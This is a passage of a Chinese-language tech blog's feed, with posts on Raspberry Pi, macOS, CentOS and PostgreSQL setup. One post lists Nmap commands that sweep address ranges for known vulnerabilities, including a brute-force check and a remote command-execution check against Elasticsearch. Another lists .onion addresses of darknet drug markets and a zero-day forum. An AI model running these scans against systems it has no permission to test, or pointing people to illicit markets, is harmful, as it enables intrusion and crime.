    <link href="http://lfoder.github.io/2018/05/06/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8B%E4%BD%BF%E7%94%A8dd%E5%85%8B%E9%9A%86%E7%B3%BB%E7%BB%9F/"/>
    <id>http://lfoder.github.io/2018/05/06/树莓派下使用dd克隆系统/</id>
    <published>2018-05-06T12:10:50.000Z</published>
    <updated>2018-05-12T08:58:11.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="情况了解"><a href="#情况了解" class="headerlink" title="情况了解"></a>情况了解</h3><blockquote><p>硬件清单：</p></blockquote><ul><li>Raspberry Pi 3B</li><li>64GB 内存卡</li><li>8G U盘</li><li>没有读卡器 没有读卡器 没有读卡器</li></ul><blockquote><p>状况简述：</p></blockquote><p>事件一 ( 树莓派从U盘启动系统 ) ： </p><p>入手了一个  <strong>树莓派3B</strong> ，很久之前 用 读卡器和一张 64GB的闲置内存卡 装了个 <code>kali arm 2.0</code> ，通过树莓派启动运行着做一个小型的渗透系统使用，但是最近系统最近被自己玩坏了，各种疑难杂症，解决方法千奇百怪，于是乎想换成 树莓派官方的专用的树莓派系统，清净一会，折腾折腾硬件。但是忽然想起来一个问题，我的读卡器出去旅行了，还没有回来，性格暴躁的我怎么可能再去淘宝上买一个新的然后等几天才收到然后重新烧写系统，虽然这样操作简单，但是我不愿意等，生命在于折腾，翻箱倒柜找到一个8G的老U盘，读写速度一般，Google了一下有没有什么办法让树莓派通过U盘启动，把官方原版系统刷到U盘上去 ，这样直接插上U盘，改点东西就能通过U盘启动了，这个东西就是<strong>引导文件</strong>，尝试修改引导通过U盘启动烧写在U盘上的树莓派官方原版系统。</p><p>事件二 ( 衍生… U盘系统已经成功启动，尝试树莓派上克隆整个系统 )：</p><p>正在运行中的U盘树莓派系统，使用 <code>dd</code> 命令来克隆U盘上的树莓派系统到原来的64G的内存卡上。从而抛弃8G的U盘，直接使用内存卡运行树莓派官方原版系统。</p><h3 id="具体实施"><a href="#具体实施" class="headerlink" title="具体实施"></a>具体实施</h3><ul><li>修改树莓派引导文件 从U盘启动系统</li></ul><blockquote><p>科普一下，树莓派的BootLoader启动顺序，树莓派会优先从TF卡(你的内存卡)启动，其次从USB端口启动。具体可以参考 <a href="http://www.52pi.net/archives/468" target="_blank" rel="noopener">这篇文章</a> ，但是因为我当前的实际情况是 kali arm 系统，不适合通过这种方式启动，因为在根目录下没有 config.txt 文件，我只能尝试直接修改根目录下的 cmdline.txt 文件 （当然是修改64G的内存卡上的 cmdline.txt）</p></blockquote><ol><li><p>首先下载官方树莓派系统 烧写到U盘，过程自行百度。</p></li><li><p>在U盘根目录下创建一个名为 <code>ssh</code> 的空文件，插上做好的U盘到树莓派上。</p></li><li><p>SSH连接到树莓派上的Kali系统，进入到 <code>/boot</code> 目录，找到 <code>cmdline.txt</code> 文件，修改文件中的 <code>root=/dev/mmcblk0p2</code>  为 <code>root=/dev/sda2</code>  </p><p>因为U盘系统做好了以后，U盘上默认有2个分区，第一个分区 为 boot引导分区 ，第二个分区为数据分区。而对于树莓派来说 ，有3个分区 ，第一个是 64G的内存卡系统，第二个是U盘的boot分区，第三个是U盘的data分区，linux下磁盘分区默认从sda后面加数字递增，所以 第一个第二个第三个分别是 sda，sda1，sda2 ，所以引导启动指定为 /dev/sda2</p></li><li><p>修改好后，直接保存 ，插上网线，然后重启</p></li><li><p>用自己的电脑执行 <code>sudo nmap -sn 192.168.1.1/24</code> ，扫描树莓派所在的网段，我是在MacOS下执行的，得加sudo，执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lfoder in ~ λ sudo nmap -sn 192.168.1.1/24</span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-06 20:47 CST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.0045s latency).</span><br><span class="line">MAC Address: 我是马赛克 (Sichuan Tianyi Comheart Telecomco.)</span><br><span class="line">Nmap scan report for 192.168.1.2</span><br><span class="line">Host is up (0.021s latency).</span><br><span class="line">MAC Address: 我是马赛克 (Apple)</span><br><span class="line">Nmap scan report for 192.168.1.4</span><br><span class="line">Host is up (0.027s latency).</span><br><span class="line">MAC Address: 我是马赛克 (Ampak Technology)</span><br><span class="line">Nmap scan report for 192.168.1.6</span><br><span class="line">Host is up (0.0062s latency).</span><br><span class="line">MAC Address: 我是马赛克 (Raspberry Pi Foundation)</span><br><span class="line">Nmap scan report for 192.168.1.11</span><br><span class="line">Host is up (0.0067s latency).</span><br><span class="line">MAC Address: 我是马赛克 (Huawei Technologies)</span><br><span class="line">Nmap scan report for 192.168.1.5</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (6 hosts up) scanned in 4.58 seconds</span><br><span class="line">lfoder in ~ λ</span><br></pre></td></tr></table></figure><p>可以看到 <code>Raspberry Pi Foundation</code> ，得知树莓派的IP是 <code>192.168.1.6</code>，然后<code>ssh pi@192.168.1.6</code>登陆之( 默认pi账户的密码是raspberry )，成功从U盘启动树莓派官方系统。</p></li></ol><ul><li>U盘树莓派系统通过dd命令克隆到内存卡</li></ul><blockquote><p>PS: 我失败了…………     &gt;…&lt; il  </p></blockquote>]]></content>
    
    <summary type="html">
    
      记录坎坷的树莓派换系统经历
    
    </summary>
    
      <category term="Raspberry Pi 笔记" scheme="http://lfoder.github.io/categories/Raspberry-Pi-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="树莓派" scheme="http://lfoder.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
      <category term="Raspberry Pi" scheme="http://lfoder.github.io/tags/Raspberry-Pi/"/>
    
      <category term="dd" scheme="http://lfoder.github.io/tags/dd/"/>
    
      <category term="系统克隆" scheme="http://lfoder.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%85%8B%E9%9A%86/"/>
    
  </entry>
  
  <entry>
    <title>MacOS安装配置与使用lrzsz文件传输工具</title>
    <link href="http://lfoder.github.io/2018/04/27/MacOS%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8lrzsz%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%B7%A5%E5%85%B7/"/>
    <id>http://lfoder.github.io/2018/04/27/MacOS安装配置与使用lrzsz文件传输工具/</id>
    <published>2018-04-27T02:53:26.000Z</published>
    <updated>2018-05-13T15:28:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>rz 可以很方便的从客户端传文件到服务器，sz也可以很方便的从服务器传文件到客户端，就算中间隔着跳板机也不影响。在mac下试了一下，mac的终端是不支持的，需要下载item2。另外不能在mac下用expect 自动登录服务器、执行rz或sz等操作，否则终端会挂掉。</p><h2 id="安装与配置"><a href="#安装与配置" class="headerlink" title="安装与配置"></a>安装与配置</h2><h3 id="安装iTerm2"><a href="#安装iTerm2" class="headerlink" title="安装iTerm2"></a>安装iTerm2</h3><p>官方下载地址:</p><p><a href="http://iterm2.com/downloads.html" target="_blank" rel="noopener">http://iterm2.com/downloads.html</a></p><p>下载完成后，解压得到 iTerm2.app 拖放到 自己应用程序(Applocation) 中即可。</p><h3 id="安装lrszs"><a href="#安装lrszs" class="headerlink" title="安装lrszs"></a>安装lrszs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install lrzsz</span><br></pre></td></tr></table></figure><p>检查是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -lah /usr/local/bin/sz</span><br><span class="line">ls -lah /usr/local/bin/rz</span><br></pre></td></tr></table></figure><h3 id="下载iTerm2-zmodem"><a href="#下载iTerm2-zmodem" class="headerlink" title="下载iTerm2-zmodem"></a>下载iTerm2-zmodem</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://raw.github.com/mmastrac/iterm2-zmodem/master/iterm2-send-zmodem.sh -O /usr/local/bin/iterm2-send-zmodem.sh</span><br><span class="line"></span><br><span class="line">sudo wget https://raw.github.com/mmastrac/iterm2-zmodem/master/iterm2-recv-zmodem.sh -O /usr/local/bin/iterm2-recv-zmodem.sh</span><br><span class="line"></span><br><span class="line">sudo chmod 777 /usr/local/bin/iterm2-*</span><br></pre></td></tr></table></figure><h3 id="配置iTerm2-添加触发Trigger"><a href="#配置iTerm2-添加触发Trigger" class="headerlink" title="配置iTerm2 添加触发Trigger"></a>配置iTerm2 添加触发Trigger</h3><p>给终端iTerm2 添加触发Trigger 事件</p><p>打开iTerm2  ==&gt; 按下 组合件 <code>command</code> + <code>,</code>   ==&gt; 找到 <code>Triggers</code> 下面的<code>Edit</code> 点击 ==&gt; 弹出一个窗口</p><p>内容写如下配置:</p><table><thead><tr><th style="text-align:center">Reguler Expression</th><th style="text-align:center">Action</th><th style="text-align:center">Parameters</th><th style="text-align:center">Instant</th></tr></thead><tbody><tr><td style="text-align:center">\*\*B0100</td><td style="text-align:center">Run Slient Coprocess…</td><td style="text-align:center">/usr/local/bin/iterm2-send-zmodem.sh</td><td style="text-align:center">✔</td></tr><tr><td style="text-align:center">\*\*B00000000000000</td><td style="text-align:center">Run Slient Coprocess…</td><td style="text-align:center">/usr/local/bin/iterm2-recv-zmodem.sh</td><td style="text-align:center">✔</td></tr></tbody></table><p>配置完成，现在你可以使用MacOS下的iTerm2终端操作lrzsz 来传输文件了。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="从本地传输文件到远程"><a href="#从本地传输文件到远程" class="headerlink" title="从本地传输文件到远程"></a>从本地传输文件到远程</h3><p>在MacOS刚配置好的iTerm2终端下使用ssh远程登录到一台你的VPS或虚拟机上，在ssh中输入 <code>rz</code> 命令，会弹出一个选择文件的窗口，选择确定后会直接传入到远程SSH的机器上。</p><h3 id="从远程传输文件到本地"><a href="#从远程传输文件到本地" class="headerlink" title="从远程传输文件到本地"></a>从远程传输文件到本地</h3><p>在MacOS刚配置好的iTerm2终端下使用ssh远程登录到一台你的VPS或虚拟机上，在ssh中输入 <code>sz</code> 命令加你要传回来的文件路径 (例如 : <code>sz /root/lfoder.txt</code>)，会弹出一个文件保存的窗口，选择位置后直接确定，即开始从远程将文件传输至本地。</p>]]></content>
    
    <summary type="html">
    
      MacOS安装配置与使用lrzsz文件传输工具，MacOS上使用 rz 和 sz 命令进行文件相互传输。
    
    </summary>
    
      <category term="MacOS 笔记" scheme="http://lfoder.github.io/categories/MacOS-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="lrzsz" scheme="http://lfoder.github.io/tags/lrzsz/"/>
    
      <category term="linux文件传输" scheme="http://lfoder.github.io/tags/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"/>
    
  </entry>
  
  <entry>
    <title>CentOS安装图形化操作界面</title>
    <link href="http://lfoder.github.io/2018/04/26/CentOS%E5%AE%89%E8%A3%85%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%93%8D%E4%BD%9C%E7%95%8C%E9%9D%A2/"/>
    <id>http://lfoder.github.io/2018/04/26/CentOS安装图形化操作界面/</id>
    <published>2018-04-26T05:18:41.000Z</published>
    <updated>2018-05-13T15:25:14.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、使用网络安装（如果网络比较快，这个方法简单）"><a href="#一、使用网络安装（如果网络比较快，这个方法简单）" class="headerlink" title="一、使用网络安装（如果网络比较快，这个方法简单）"></a>一、使用网络安装（如果网络比较快，这个方法简单）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum groupinstall <span class="string">"Desktop"</span></span><br><span class="line">yum groupinstall <span class="string">"X Window System"</span></span><br><span class="line">yum groupinstall <span class="string">"Chinese Support"</span></span><br><span class="line">yum groupinstall <span class="string">"Font"</span></span><br><span class="line"></span><br><span class="line">startx</span><br></pre></td></tr></table></figure><h3 id="二、使用光盘安装（本地安装，速度快，麻烦一点）"><a href="#二、使用光盘安装（本地安装，速度快，麻烦一点）" class="headerlink" title="二、使用光盘安装（本地安装，速度快，麻烦一点）"></a>二、使用光盘安装（本地安装，速度快，麻烦一点）</h3><p>见：<a href="http://blog.163.com/tsee123@126/blog/static/3514054520118862320896/" target="_blank" rel="noopener">http://blog.163.com/tsee123@126/blog/static/3514054520118862320896/</a></p><p>1、首先进行光盘的挂载，注意光盘挂载时不会自动建立目录的，所以需要自己建立目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /mnt/cdrom</span><br><span class="line">mount /dev/cdrom /mnt/cdrom       #dev目录为设备目录</span><br></pre></td></tr></table></figure><p>2、更改本地源地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/yum.repos.d/         #可以看见CentOS-Base.repo和CentOS-Media.repo文件</span><br></pre></td></tr></table></figure><p>注意：<br>CentOS-Base.repo记录着网络上的yum源的地址和路径信息等<br>CentOS-Media.repo记录着可以从本地作为yum源的介质和路径<br>所以，我们更改CentOS-Media.repo就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">baseurl=file:///media/CentOS/</span><br><span class="line">              file:///media/cdrom/</span><br><span class="line">              file:///media/cdrecorder/</span><br><span class="line">              file:///mnt/cdrom    #增加这句</span><br></pre></td></tr></table></figure><p>3、我们安装gnome，但是在centos6里，gnome已经被改为Desktop了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --disablerepo=* --enablerepo=c6-media groupinstall <span class="string">"Desktop"</span></span><br></pre></td></tr></table></figure><p># 当然也可以看下有没有 groupinstall 改为 grouplist<br>4、安装好了gnome，还需安装X Window</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --disablerepo=* --enablerepo=c6-media groupinstall <span class="string">"X Window System"</span></span><br></pre></td></tr></table></figure><p>5、然后我们安装中文语言</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --disablerepo=* --enablerepo=c6-media groupinstall <span class="string">"Chinese Support"</span></span><br></pre></td></tr></table></figure><p>6、最关键的一步了，启动gnome</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startx</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      CentOS 安装图形化操作界面步骤
    
    </summary>
    
      <category term="Linux 笔记" scheme="http://lfoder.github.io/categories/Linux-%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Nmap扫描与发现漏洞全技巧</title>
    <link href="http://lfoder.github.io/2018/04/12/Nmap%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E5%85%A8%E6%8A%80%E5%B7%A7/"/>
    <id>http://lfoder.github.io/2018/04/12/Nmap扫描与发现漏洞全技巧/</id>
    <published>2018-04-12T07:13:51.000Z</published>
    <updated>2018-05-13T15:28:56.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞主机发现"><a href="#漏洞主机发现" class="headerlink" title="漏洞主机发现"></a>漏洞主机发现</h3><h4 id="验证iis短文件名泄露"><a href="#验证iis短文件名泄露" class="headerlink" title="验证iis短文件名泄露"></a>验证iis短文件名泄露</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 --script http-iis-short-name-brute 192.168.0.1/24</span><br></pre></td></tr></table></figure><h4 id="验证Memcached未授权访问漏洞"><a href="#验证Memcached未授权访问漏洞" class="headerlink" title="验证Memcached未授权访问漏洞"></a>验证Memcached未授权访问漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 11211 -script memcached-info 192.168.0.1/24</span><br></pre></td></tr></table></figure><h4 id="验证http-sys远程代码执行漏洞"><a href="#验证http-sys远程代码执行漏洞" class="headerlink" title="验证http.sys远程代码执行漏洞"></a>验证http.sys远程代码执行漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV  -script http-vuln-cve2015-1635 192.168.0.1/24</span><br></pre></td></tr></table></figure><h4 id="验证心脏出血漏洞"><a href="#验证心脏出血漏洞" class="headerlink" title="验证心脏出血漏洞"></a>验证心脏出血漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script=ssl-heartbleed 192.168.0.1/24</span><br></pre></td></tr></table></figure><h4 id="验证Mongodb未授权访问漏洞"><a href="#验证Mongodb未授权访问漏洞" class="headerlink" title="验证Mongodb未授权访问漏洞"></a>验证Mongodb未授权访问漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 27017 --script mongodb-info 192.168.0.1/24</span><br></pre></td></tr></table></figure><h4 id="验证Redis未授权访问漏洞"><a href="#验证Redis未授权访问漏洞" class="headerlink" title="验证Redis未授权访问漏洞"></a>验证Redis未授权访问漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 6379 --script redis-info 192.168.0.1/24</span><br></pre></td></tr></table></figure><h4 id="验证Elasticsearch未授权访问漏洞"><a href="#验证Elasticsearch未授权访问漏洞" class="headerlink" title="验证Elasticsearch未授权访问漏洞"></a>验证Elasticsearch未授权访问漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=http-vuln-cve2015-1427 --script-args command=&apos;ls&apos; 192.168.0.1/24</span><br></pre></td></tr></table></figure><h4 id="验证Rsync未授权访问漏洞"><a href="#验证Rsync未授权访问漏洞" class="headerlink" title="验证Rsync未授权访问漏洞"></a>验证Rsync未授权访问漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 873 --script rsync-brute --script-args &apos;rsync-brute.module=www&apos; 192.168.0.1/24</span><br></pre></td></tr></table></figure><blockquote><p>相关资料：</p><p><a href="https://blog.csdn.net/jiangliuzheng/article/details/51992220" target="_blank" rel="noopener">https://blog.csdn.net/jiangliuzheng/article/details/51992220</a></p><p><a href="https://blog.csdn.net/hackerie/article/details/78065636" target="_blank" rel="noopener">https://blog.csdn.net/hackerie/article/details/78065636</a></p><p><a href="http://www.vuln.cn/2444" target="_blank" rel="noopener">http://www.vuln.cn/2444</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      收集 Nmap 扫描与发现漏洞的各种脚本与实践
    
    </summary>
    
      <category term="Nmap 笔记" scheme="http://lfoder.github.io/categories/Nmap-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Nmap" scheme="http://lfoder.github.io/tags/Nmap/"/>
    
  </entry>
  
  <entry>
    <title>DarkNet - 暗网导航Wiki  (持续更新)</title>
    <link href="http://lfoder.github.io/2018/04/11/DarkNet/"/>
    <id>http://lfoder.github.io/2018/04/11/DarkNet/</id>
    <published>2018-04-10T16:19:55.000Z</published>
    <updated>2018-04-28T04:07:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DarkNet-暗网导航Wiki-持续更新"><a href="#DarkNet-暗网导航Wiki-持续更新" class="headerlink" title="DarkNet - 暗网导航Wiki  (持续更新)"></a>DarkNet - 暗网导航Wiki  (持续更新)</h2><h3 id="Search-Engine"><a href="#Search-Engine" class="headerlink" title="Search Engine"></a>Search Engine</h3><table><thead><tr><th style="text-align:center">Site</th><th style="text-align:center">Domain</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">The Pirate Bay</td><td style="text-align:center">uj3wazyk5u4hnvtk.onion</td><td style="text-align:center">BT Search</td></tr><tr><td style="text-align:center">not Evil</td><td style="text-align:center">hss3uro2hsxfogfq.onion</td><td style="text-align:center">DarkNet Search Engine</td></tr><tr><td style="text-align:center">The Hidden Wiki</td><td style="text-align:center">zqktlwi4fecvo6ri.onion</td><td style="text-align:center">DarkNet  Navigation</td></tr><tr><td style="text-align:center">DuckDuckGO</td><td style="text-align:center">3g2upl4pq6kufc4m.onion</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">Tor Search Engine</td><td style="text-align:center">xmh57jrzrnw6insl.onion</td></tr></tbody></table><h3 id="Market"><a href="#Market" class="headerlink" title="Market"></a>Market</h3><table><thead><tr><th style="text-align:center">Site</th><th style="text-align:center">Domain</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">UnderMarket</td><td style="text-align:center">un62d2ywi33bho53.onion</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">DreamMarket</td><td style="text-align:center">4buzlb3uhrjby2sb.onion</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">Silk Road</td><td style="text-align:center">silkroad7rn2puhj.onion</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">WallstMarket</td><td style="text-align:center">wallstyizjhkrvmj.onion</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$$$</td><td style="text-align:center">2jv5r7k66ralyk3g.onion</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">BlockChain</td><td style="text-align:center">blockchainbdgpzk.onion</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">EmpireMarket</td><td style="text-align:center">hsqluhqe6dlfl7jaxulf7cfun6xt274btvnqvaorliem5j6sqjiwhdyd.onion</td></tr></tbody></table><h3 id="Forum"><a href="#Forum" class="headerlink" title="Forum"></a>Forum</h3><table><thead><tr><th style="text-align:center">Site</th><th style="text-align:center">Domain</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">0day</td><td style="text-align:center">qzbkwswfv5k2oj5d.onion</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">Silk Road Forum</td><td style="text-align:center">satri4bb5r56y253.onion</td></tr></tbody></table><h3 id="Community"><a href="#Community" class="headerlink" title="Community"></a>Community</h3><table><thead><tr><th style="text-align:center">Site</th><th style="text-align:center">Domain</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">facebook</td><td style="text-align:center"><a href="http://www.facebookcorewwwi.onion" target="_blank" rel="noopener">www.facebookcorewwwi.onion</a></td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      通过Tor爬虫和深度学习来记录并分析暗网活跃的站点列表，暂不公布技术细节，最后更新时间 2018年04月28日12:06:57
    
    </summary>
    
      <category term="洋葱网络" scheme="http://lfoder.github.io/categories/%E6%B4%8B%E8%91%B1%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="tor" scheme="http://lfoder.github.io/tags/tor/"/>
    
      <category term="暗网" scheme="http://lfoder.github.io/tags/%E6%9A%97%E7%BD%91/"/>
    
      <category term="darknet" scheme="http://lfoder.github.io/tags/darknet/"/>
    
      <category term="匿名浏览" scheme="http://lfoder.github.io/tags/%E5%8C%BF%E5%90%8D%E6%B5%8F%E8%A7%88/"/>
    
  </entry>
  
  <entry>
    <title>Mounty挂载失败解决方法</title>
    <link href="http://lfoder.github.io/2018/03/12/Mounty%E6%8C%82%E8%BD%BD%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>http://lfoder.github.io/2018/03/12/Mounty挂载失败解决方法/</id>
    <published>2018-03-12T03:00:11.000Z</published>
    <updated>2018-03-13T02:43:10.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>错误过程</strong>：</p><p>开机启动 <code>Mounty</code> 挂载NTFS磁盘时出现挂载失败的情况，磁盘在win下面没有安全删除就拔出来了，导致文件系统中有错误区块，所以在MAC中不能挂载成读写模式。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fp9ungtfepj30ng08et8x.jpg" alt=""></p><p>卷”BOOTCAMP “不可重新挂载</p><p><strong>解决方案</strong>：</p><p>到 win 下 对不可挂载的NTFS磁盘，进行 <code>chkdsk /f</code> 操作 ，并在结束后安全移除磁盘</p>]]></content>
    
    <summary type="html">
    
      Mounty挂载失败的时候，一些解决方案
    
    </summary>
    
    
      <category term="Mounty" scheme="http://lfoder.github.io/tags/Mounty/"/>
    
  </entry>
  
  <entry>
    <title>MacOS安装PostgreSQL</title>
    <link href="http://lfoder.github.io/2018/03/09/MacOS%E5%AE%89%E8%A3%85PostgreSQL/"/>
    <id>http://lfoder.github.io/2018/03/09/MacOS安装PostgreSQL/</id>
    <published>2018-03-09T04:31:29.000Z</published>
    <updated>2018-05-13T15:59:28.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><ul><li>macOS Sierra <code>10.12.6</code></li></ul><h3 id="安装-PostgreSQL"><a href="#安装-PostgreSQL" class="headerlink" title="安装 PostgreSQL"></a>安装 PostgreSQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install postgresql</span><br></pre></td></tr></table></figure><h3 id="配置-PostgreSQL"><a href="#配置-PostgreSQL" class="headerlink" title="配置 PostgreSQL"></a>配置 PostgreSQL</h3><h4 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ pg_ctl -V</span><br><span class="line">pg_ctl (PostgreSQL) 10.3</span><br></pre></td></tr></table></figure><p>安装成功之后，安装路径为：<code>/usr/local/var/postgres</code></p><h4 id="初始化数据库"><a href="#初始化数据库" class="headerlink" title="初始化数据库"></a>初始化数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initdb /usr/local/var/postgres</span><br></pre></td></tr></table></figure><h4 id="手动启动-PostgreSQL"><a href="#手动启动-PostgreSQL" class="headerlink" title="手动启动 PostgreSQL"></a>手动启动 PostgreSQL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log start</span><br></pre></td></tr></table></figure><h4 id="查看-PostgreSQL-运行状态"><a href="#查看-PostgreSQL-运行状态" class="headerlink" title="查看 PostgreSQL 运行状态"></a>查看 PostgreSQL 运行状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log status</span><br></pre></td></tr></table></figure><h4 id="手动停止-PostgreSQL"><a href="#手动停止-PostgreSQL" class="headerlink" title="手动停止 PostgreSQL"></a>手动停止 PostgreSQL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log stop -s -m fast</span><br></pre></td></tr></table></figure><h4 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep postgres</span><br></pre></td></tr></table></figure><h4 id="创建用户和数据库-（此处未测试）"><a href="#创建用户和数据库-（此处未测试）" class="headerlink" title="创建用户和数据库 （此处未测试）"></a>创建用户和数据库 （此处未测试）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#createuser will prompt you for a password, enter it twice.</span><br><span class="line">$ createuser -U postgres -P 123456</span><br><span class="line">$ createdb -O postgres -E utf8 test_db</span><br><span class="line">$ psql</span><br><span class="line">postgres=# GRANT ALL PRIVILEGES ON postgres TO postgres;</span><br><span class="line">postgres=# \q</span><br></pre></td></tr></table></figure><h4 id="进入命令行模式"><a href="#进入命令行模式" class="headerlink" title="进入命令行模式"></a>进入命令行模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -U test test_db -h localhost -W</span><br></pre></td></tr></table></figure><h4 id="设置开机自启动"><a href="#设置开机自启动" 